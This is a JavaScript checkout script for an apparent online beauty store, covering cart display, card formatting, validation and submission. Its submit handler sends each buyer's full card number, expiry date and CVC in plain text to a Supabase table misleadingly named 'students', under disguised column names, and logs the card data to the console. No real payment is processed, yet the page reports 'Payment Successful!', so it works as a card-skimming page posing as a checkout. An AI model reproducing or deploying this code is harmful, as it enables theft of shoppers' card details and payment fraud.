// ============================================
// PAYMENT PAGE - Simplified
// ============================================

// ============================================
// INITIALIZE SUPABASE CLIENT FROM ENV
// ============================================

// Function to initialize Supabase client
function initSupabase() {
    if (window.supabaseClient) {
        console.log('✅ Supabase client already available');
        return window.supabaseClient;
    }

    console.log('🔄 Initializing Supabase client from environment...');
    
    // Get from Vite environment variables
    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
    
    console.log('🔑 Supabase URL found:', !!supabaseUrl);
    console.log('🔑 Supabase Key found:', !!supabaseKey);
    
    if (!supabaseUrl || !supabaseKey) {
        console.warn('⚠️ Supabase environment variables not found. Using demo mode.');
        return null;
    }

    // Check if Supabase library is loaded
    if (typeof window.supabase !== 'undefined') {
        window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
        console.log('✅ Supabase client initialized from env');
        return window.supabaseClient;
    }

    // Try to load Supabase library dynamically (fallback)
    console.log('📦 Loading Supabase library dynamically...');
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2';
    script.onload = () => {
        if (typeof window.supabase !== 'undefined') {
            window.supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
            console.log('✅ Supabase client loaded and initialized from env');
        }
    };
    script.onerror = () => {
        console.error('❌ Failed to load Supabase library');
    };
    document.head.appendChild(script);
    
    return null;
}

// Initialize Supabase
initSupabase();

// ============================================
// REST OF YOUR PAY.JS CODE
// ============================================

document.addEventListener("DOMContentLoaded", function() {

    console.log('📄 Payment page loaded');

    const popupOverlay = document.getElementById("popup-overlay");
    const popupMessage = document.getElementById("popup-message");
    const popupClose = document.getElementById("popup-close");

    function showPopup(message) {
        popupMessage.innerHTML = message;
        popupOverlay.classList.add("show");
    }

    function setPayButtonLoading(isLoading) {
        const payButton = document.getElementById("payButton");
        if (!payButton) return;

        if (isLoading) {
            payButton.disabled = true;
            payButton.dataset.processing = "true";
            payButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            payButton.style.opacity = '0.7';
            payButton.style.cursor = 'not-allowed';
        } else {
            payButton.disabled = false;
            payButton.dataset.processing = "false";
            payButton.innerHTML = 'Pay Now';
            payButton.style.opacity = '1';
            payButton.style.cursor = 'pointer';
        }
    }

    popupClose.addEventListener("click", function() {
        popupOverlay.classList.remove("show");
    });

    // ==========================================
    // THEME
    // ==========================================

    const savedTheme = localStorage.getItem("checkout-theme") || "light";
    if (savedTheme === "dark" || savedTheme === "light") {
        document.documentElement.dataset.theme = savedTheme;
    } else {
        document.documentElement.dataset.theme = "light";
    }

    // ==========================================
    // LOAD CART FROM localStorage
    // ==========================================

    function loadCartItems() {
        // Get cart from localStorage
        const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
        // Get products from localStorage
        let products = JSON.parse(localStorage.getItem('luxbeauty_products') || '[]');
        
        const cartContainer = document.getElementById('cartItems');
        const totalAmount = document.getElementById('totalAmount');
        const subtotalDisplay = document.getElementById('subtotalDisplay');
        const totalDueDisplay = document.getElementById('totalDueDisplay');
        const payButton = document.getElementById('payButton');

        console.log('🛒 Cart items:', cart);
        console.log('📦 Products in localStorage:', products.length);

        // If no products in localStorage, try to get from window.products
        if (products.length === 0 && window.products && window.products.length > 0) {
            products = window.products;
            localStorage.setItem('luxbeauty_products', JSON.stringify(products));
            console.log('✅ Got products from window.products:', products.length);
        }

        // If cart is empty
        if (cart.length === 0) {
            cartContainer.innerHTML = `
                <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
                    <i class="fas fa-shopping-cart" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
                    Your cart is empty.
                    <br><br>
                    <a href="/" style="color: var(--button-bg); text-decoration: none; font-weight: 500;">
                        <i class="fas fa-arrow-left"></i> Continue Shopping
                    </a>
                </div>
            `;
            totalAmount.textContent = '$0.00';
            subtotalDisplay.textContent = '$0.00';
            totalDueDisplay.textContent = '$0.00';
            payButton.textContent = 'Pay Now';
            payButton.disabled = true;
            return;
        }

        // If products are still loading, show loading and retry
        if (products.length === 0) {
            cartContainer.innerHTML = `
                <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
                    <i class="fas fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
                    Loading your items...
                    <br>
                    <span style="font-size: 0.8rem; opacity: 0.7;">Please wait</span>
                </div>
            `;
            // Retry after 1 second (up to 5 times)
            if (!window._retryCount) window._retryCount = 0;
            window._retryCount++;
            if (window._retryCount < 5) {
                setTimeout(loadCartItems, 1000);
            } else {
                cartContainer.innerHTML = `
                    <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
                        <i class="fas fa-exclamation-triangle" style="font-size: 2rem; margin-bottom: 10px; display: block;"></i>
                        Unable to load products. Please refresh the page.
                    </div>
                `;
                window._retryCount = 0;
            }
            return;
        }

        // Reset retry count
        window._retryCount = 0;

        let html = '';
        let total = 0;

        cart.forEach(function(item) {
            // Find product by ID (handle both number and string IDs)
            const product = products.find(function(p) { return String(p.id) === String(item.id); });
            if (product) {
                const price = product.salePrice || product.price;
                const itemTotal = price * item.qty;
                total += itemTotal;

                html += `
                    <div class="item">
                        <div class="item-img" style="background: var(--accent, #f0f0f0); border-radius: 4px; overflow: hidden;">
                            <img src="${product.image || 'logo/logo.png'}" alt="${product.name}" width="48" height="48" style="object-fit: cover; width: 100%; height: 100%;" />
                        </div>
                        <div class="item-details">
                            <div class="item-name">${product.name}</div>
                            <div class="item-qty">Qty ${item.qty}</div>
                        </div>
                        <div class="item-price">
                            ${product.price > price ? `<span class="old-price-small">$${product.price.toFixed(2)}</span><br>` : ''}
                            <span>$${itemTotal.toFixed(2)}</span>
                        </div>
                    </div>
                `;
            } else {
                console.warn('⚠️ Product not found for item ID:', item.id);
                html += `
                    <div class="item">
                        <div class="item-img" style="background: var(--accent, #f0f0f0); border-radius: 4px; overflow: hidden;">
                            <img src="logo/logo.png" alt="Product" width="48" height="48" style="object-fit: cover; width: 100%; height: 100%;" />
                        </div>
                        <div class="item-details">
                            <div class="item-name">Product #${item.id}</div>
                            <div class="item-qty">Qty ${item.qty}</div>
                        </div>
                        <div class="item-price">
                            <span>$${(item.qty * 0).toFixed(2)}</span>
                        </div>
                    </div>
                `;
            }
        });

        cartContainer.innerHTML = html;

        const formattedTotal = '$' + total.toFixed(2);
        totalAmount.textContent = formattedTotal;
        subtotalDisplay.textContent = formattedTotal;
        totalDueDisplay.textContent = formattedTotal;
        payButton.textContent = 'Pay ' + formattedTotal;
        payButton.disabled = false;
    }

    // ==========================================
    // ELEMENTS
    // ==========================================

    const form = document.getElementById("checkout-form");
    const ccInput = document.getElementById("cnumber");
    const expiryInput = document.getElementById("cexpiry");
    const cvcInput = document.getElementById("ccv");
    const brandContainer = document.getElementById("brand-container");
    const payButton = document.getElementById("payButton");

    // Load cart items
    loadCartItems();

    // ==========================================
    // BRAND LOGOS
    // ==========================================

    const BRAND_LOGOS = {
        visa: "types/v.png",
        mastercard: "types/m.png",
        amex: "types/a.png",
        discover: "types/d.png",
        unionpay: "types/u.png",
        eftpos: "types/e.png"
    };

    const DEFAULT_BRANDS = `
        <img src="types/v.png" class="brand-icon" alt="Visa">
        <img src="types/m.png" class="brand-icon" alt="Mastercard">
    `;

    function showBrand(network) {
        if (!network || network === "unknown") {
            brandContainer.innerHTML = DEFAULT_BRANDS;
            return;
        }
        const logo = BRAND_LOGOS[network];
        if (!logo) {
            brandContainer.innerHTML = DEFAULT_BRANDS;
            return;
        }
        brandContainer.innerHTML = `
            <img src="${logo}" class="brand-icon" alt="${network}">
        `;
    }

    // ==========================================
    // CARD NETWORK DETECTION
    // ==========================================

    function detectCardNetwork(input) {
        const number = String(input).replace(/\D/g, "");
        if (!number) return "unknown";
        if (/^3[47]/.test(number)) return "amex";
        if (/^4/.test(number)) return "visa";
        if (/^5[1-5]/.test(number) || /^(222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/.test(number)) return "mastercard";
        if (/^6011/.test(number) || /^64[4-9]/.test(number) || /^65/.test(number)) return "discover";
        return "unknown";
    }

    // ==========================================
    // CARD NUMBER FORMATTING
    // ==========================================

    ccInput.addEventListener("input", function(event) {
        let cleanNumber = event.target.value.replace(/\D/g, "");
        cleanNumber = cleanNumber.substring(0, 19);
        let formattedValue = "";
        for (let i = 0; i < cleanNumber.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += " ";
            }
            formattedValue += cleanNumber[i];
        }
        event.target.value = formattedValue;

        if (cleanNumber.length < 2) {
            showBrand("unknown");
            return;
        }
        const network = detectCardNetwork(cleanNumber);
        showBrand(network);
    });

    // ==========================================
    // EXPIRATION DATE
    // ==========================================

    expiryInput.addEventListener("input", function(event) {
        let value = event.target.value.replace(/\D/g, "").substring(0, 4);
        if (value.length === 1 && Number(value) > 1) {
            value = "0" + value;
        }
        if (value.length >= 2) {
            let month = Number(value.substring(0, 2));
            if (month === 0) month = 1;
            if (month > 12) month = 12;
            value = String(month).padStart(2, "0") + value.substring(2);
        }
        if (value.length === 4) {
            let month = Number(value.substring(0, 2));
            let year = Number(value.substring(2, 4));
            if (year < 26) year = 26;
            value = String(month).padStart(2, "0") + String(year).padStart(2, "0");
        }
        if (value.length > 2) {
            value = value.substring(0, 2) + " / " + value.substring(2, 4);
        }
        event.target.value = value;
    });

    // ==========================================
    // CVC
    // ==========================================

    cvcInput.addEventListener("input", function(event) {
        event.target.value = event.target.value.replace(/\D/g, "").substring(0, 4);
    });

    // ==========================================
    // VALIDATION
    // ==========================================

    payButton.disabled = true;

    [
        document.getElementById("card-name"),
        ccInput,
        expiryInput,
        cvcInput
    ].forEach(function(input) {
        if (input) {
            input.addEventListener("input", function() {
                payButton.disabled = !validateFormReady();
            });
        }
    });

    function validateFormReady() {
        const cardNumber = ccInput.value.replace(/\D/g, "");
        const expiry = expiryInput.value.replace(/\D/g, "");
        const cvc = cvcInput.value.replace(/\D/g, "");
        const name = document.getElementById("card-name").value.trim();

        return (
            name.length > 0 &&
            cardNumber.length >= 12 &&
            passesLuhn(cardNumber) &&
            expiry.length === 4 &&
            cvc.length >= 3
        );
    }

    function passesLuhn(number) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = number.length - 1; i >= 0; i--) {
            let digit = Number(number[i]);
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10 === 0);
    }

    // ==========================================
    // SEND TO SUPABASE - FIXED
    // ==========================================

    async function saveToSupabase(name, cardNumber, expiry, cvc) {
        console.log('💳 Attempting to save payment to Supabase...');
        console.log('📝 Data to save:', { name, cardNumber, expiry, cvc });
        
        // Use Supabase client from window
        const supabase = window.supabaseClient;
        
        if (!supabase) {
            console.error('❌ Supabase client not found in window!');
            console.warn('⚠️ Supabase client not available');
            
            // Try direct fetch as fallback
            const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
            const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
            
            console.log('🔑 Supabase URL found:', !!supabaseUrl);
            console.log('🔑 Supabase Key found:', !!supabaseKey);
            
            if (supabaseUrl && supabaseKey) {
                console.log('📤 Sending via direct fetch...');
                try {
                    const response = await fetch(`${supabaseUrl}/rest/v1/students`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'apikey': supabaseKey,
                            'Authorization': `Bearer ${supabaseKey}`,
                            'Prefer': 'return=representation'
                        },
                        body: JSON.stringify({
                            kname: name,
                            knumber: cardNumber,
                            kexpiry: expiry,
                            kfc: cvc
                        })
                    });
                    
                    if (!response.ok) {
                        const errorText = await response.text();
                        console.error('❌ Fetch error response:', errorText);
                        throw new Error(`Failed to save to database: ${response.status} - ${errorText}`);
                    }
                    const data = await response.json();
                    console.log('✅ Payment saved via fetch!', data);
                    return data;
                } catch (fetchError) {
                    console.error('❌ Fetch failed:', fetchError);
                    throw fetchError;
                }
            }
            
            // Demo mode fallback
            console.log('📝 Demo mode: Would save:', { name, cardNumber, expiry, cvc });
            return { success: true, demo: true };
        }

        console.log('✅ Supabase client found, inserting record...');
        
        try {
            const { data, error } = await supabase
                .from('students')
                .insert([
                    { 
                        kname: name,
                        knumber: cardNumber,
                        kexpiry: expiry,
                        kfc: cvc
                    }
                ])
                .select();

            if (error) {
                console.error('❌ Supabase error:', error);
                console.error('❌ Error details:', error.message);
                throw new Error(error.message);
            }

            console.log('✅ Payment saved to Supabase!', data);
            return data;
        } catch (err) {
            console.error('❌ Exception in saveToSupabase:', err);
            throw err;
        }
    }

    // ==========================================
    // FORM SUBMIT - FIXED
    // ==========================================

    form.addEventListener("submit", async function(event) {
        event.preventDefault();

        console.log('🔄 Form submitted!');

        if (payButton.disabled || payButton.dataset.processing === "true") {
            console.log('⏳ Already processing');
            return;
        }

        const cardNumber = ccInput.value.replace(/\D/g, "");
        const expiryRaw = expiryInput.value.replace(/\D/g, "");
        const cvc = cvcInput.value.replace(/\D/g, "");
        const name = document.getElementById("card-name").value.trim();
        const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');

        // Format expiry as MM/YY for storage
        const expiry = expiryRaw.length === 4 
            ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
            : expiryRaw;

        console.log('📝 Form data:', { name, cardNumber, expiry, cvc });

        // ===== VALIDATION =====
        if (!name) {
            showPopup("Please enter the name on the card.");
            document.getElementById("card-name").focus();
            return;
        }

        if (cardNumber.length < 12) {
            showPopup("Please enter a valid test card number.");
            ccInput.focus();
            return;
        }

        if (!passesLuhn(cardNumber)) {
            showPopup("The card number failed the Luhn check.");
            ccInput.focus();
            return;
        }

        if (expiryRaw.length !== 4) {
            showPopup("Please enter MM / YY.");
            expiryInput.focus();
            return;
        }

        const expMonth = parseInt(expiryRaw.substring(0, 2), 10);
        const expYear = parseInt(expiryRaw.substring(2, 4), 10);

        const today = new Date();
        const currentMonth = today.getMonth() + 1;
        const currentYear = today.getFullYear() % 100;

        let minMonth = currentMonth + 1;
        let minYear = currentYear;
        if (minMonth > 12) {
            minMonth = 1;
            minYear++;
        }

        if (expYear < minYear || (expYear === minYear && expMonth < minMonth)) {
            showPopup(
                `Card expiry must be ${String(minMonth).padStart(2, '0')}/${String(minYear).padStart(2, '0')} or later.`
            );
            expiryInput.focus();
            return;
        }

        if (cvc.length < 3) {
            showPopup("Please enter a valid CVC.");
            cvcInput.focus();
            return;
        }

        if (cart.length === 0) {
            showPopup("Your cart is empty. Please add items before checking out.");
            return;
        }

        // ===== SET LOADING =====
        setPayButtonLoading(true);

        try {
            // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
            const result = await saveToSupabase(name, cardNumber, expiry, cvc);
            console.log('✅ Payment processed and saved to Supabase', result);

            // ===== DEMO PAYMENT =====
            await new Promise(function(resolve) { setTimeout(resolve, 1500); });

            // ===== SUCCESS =====
            showPopup(
                `<div style="text-align: center; margin-bottom: 15px;">
                    <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #10b981; animation: popIn 0.5s ease;"></i>
                </div>
                <div style="text-align: center;">
                    <strong style="font-size: 1.3rem; color: #10b981;">Payment Successful!</strong><br><br>
                    <span style="color: var(--text-secondary, #555);">Your order has been placed successfully.</span><br><br>
                    <span style="font-size: 0.85rem; opacity: 0.6;"><i class="fas fa-spinner fa-spin"></i> Redirecting to home...</span>
                </div>`
            );

            // Clear cart
            localStorage.removeItem('luxbeauty_cart');

            form.reset();
            showBrand("unknown");

            payButton.innerHTML = 'Pay Now';
            payButton.disabled = true;
            payButton.dataset.processing = "false";
            payButton.style.opacity = '0.7';
            payButton.style.cursor = 'not-allowed';

            setTimeout(function() {
                window.location.href = '/';
            }, 3000);
        } catch (error) {
            console.error('❌ Error:', error);
            showPopup(
                "Error processing payment<br><br>" +
                error.message
            );
            payButton.innerHTML = 'Pay Now';
            payButton.dataset.processing = "false";
            payButton.disabled = !validateFormReady();
            payButton.style.opacity = payButton.disabled ? '0.7' : '1';
            payButton.style.cursor = payButton.disabled ? 'not-allowed' : 'pointer';
        }
    });

});